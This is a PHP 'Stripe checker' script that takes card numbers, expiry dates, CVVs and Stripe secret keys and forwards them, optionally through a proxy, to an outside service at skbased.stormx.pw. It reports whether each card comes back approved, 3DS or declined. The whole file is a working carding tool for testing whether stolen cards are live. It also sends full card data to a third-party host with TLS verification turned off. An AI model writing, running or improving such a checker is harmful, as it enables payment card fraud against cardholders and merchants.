<?php
// Key Based Stripe Checker Gateway
// Calls the external API at stormx.pw

header('Content-Type: text/plain');

$card = $_POST['cc'] ?? $_GET['cc'] ?? '';
$sk = $_POST['sk'] ?? $_GET['sk'] ?? '';
$pk = $_POST['pk'] ?? $_GET['pk'] ?? '';
$amount = $_POST['amount'] ?? $_GET['amount'] ?? '1.00';
$key = $_POST['api_key'] ?? $_GET['api_key'] ?? 'Darkboy';
$proxy = $_POST['proxy'] ?? $_GET['proxy'] ?? '';

if (empty($card)) {
    echo "ERROR: No card provided";
    exit;
}

if (empty($sk) || empty($pk)) {
    echo "ERROR: Stripe keys required (sk and pk)";
    exit;
}

// Parse card format
$parts = explode('|', $card);
if (count($parts) < 4) {
    echo "DECLINED: Invalid card format. Use: number|month|year|cvv";
    exit;
}

list($cardNumber, $month, $year, $cvv) = $parts;

// Build the API URL
$apiUrl = "https://skbased.stormx.pw/skbased";
$params = [
    'key' => $key,
    'sk' => $sk,
    'pk' => $pk,
    'amount' => $amount,
    'cc' => "{$cardNumber}|{$month}|{$year}|{$cvv}"
];

$url = $apiUrl . '?' . http_build_query($params);

// Make the request with optional proxy
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode !== 200) {
    echo "DECLINED: API request failed (HTTP $httpCode)";
    exit;
}

// Parse response
$result = json_decode($response, true);

// Helper function to clean and format decline messages
function cleanDeclineMessage($data) {
    // If it's a string, return it as is
    if (is_string($data)) {
        return $data;
    }
    
    // If it's an array, try to extract the message
    if (is_array($data)) {
        // Check for message field
        if (isset($data['message']) && is_string($data['message'])) {
            return $data['message'];
        }
        
        // Check for decline_code field
        if (isset($data['decline_code']) && is_string($data['decline_code'])) {
            $code = $data['decline_code'];
            $messages = [
                'generic_decline' => 'Card declined',
                'insufficient_funds' => 'Insufficient funds',
                'lost_card' => 'Lost card',
                'stolen_card' => 'Stolen card',
                'expired_card' => 'Expired card',
                'card_declined' => 'Card declined by issuer',
                'incorrect_cvc' => 'Incorrect CVV',
                'incorrect_zip' => 'Incorrect ZIP code',
                'incorrect_number' => 'Incorrect card number',
                'invalid_expiry_month' => 'Invalid expiry month',
                'invalid_expiry_year' => 'Invalid expiry year',
                'invalid_cvc' => 'Invalid CVV',
                'invalid_number' => 'Invalid card number',
                'live_mode_test_card' => 'Test card cannot be used in live mode',
                'pickup_card' => 'Card pickup required',
                'fraudulent' => 'Fraudulent transaction',
                'do_not_honor' => 'Transaction declined',
                'authentication_required' => 'Authentication required'
            ];
            return $messages[$code] ?? $code;
        }
        
        // Check for code field
        if (isset($data['code']) && is_string($data['code'])) {
            return $data['code'];
        }
        
        // Return first string value found
        foreach ($data as $value) {
            if (is_string($value) && !empty($value)) {
                return $value;
            }
        }
    }
    
    return 'Transaction declined';
}

// Check if the response has the expected structure
if ($result && isset($result['status'])) {
    $status = strtoupper((string)$result['status']);
    
    // Clean the message
    $rawMessage = $result['message'] ?? '';
    $cleanMessage = cleanDeclineMessage($rawMessage);
    
    if ($status === 'APPROVED' || $status === 'LIVE' || $status === 'SUCCESS') {
        echo "APPROVED: " . $cleanMessage;
    } elseif ($status === '3DS' || strpos($cleanMessage, '3DS') !== false) {
        echo "3DS: " . $cleanMessage;
    } else {
        echo "DECLINED: " . $cleanMessage;
    }
} elseif ($result && isset($result['error'])) {
    $cleanError = cleanDeclineMessage($result['error']);
    echo "DECLINED: " . $cleanError;
} else {
    // Try to clean the entire response
    $cleanResponse = cleanDeclineMessage($result);
    echo "DECLINED: " . $cleanResponse;
}
?>
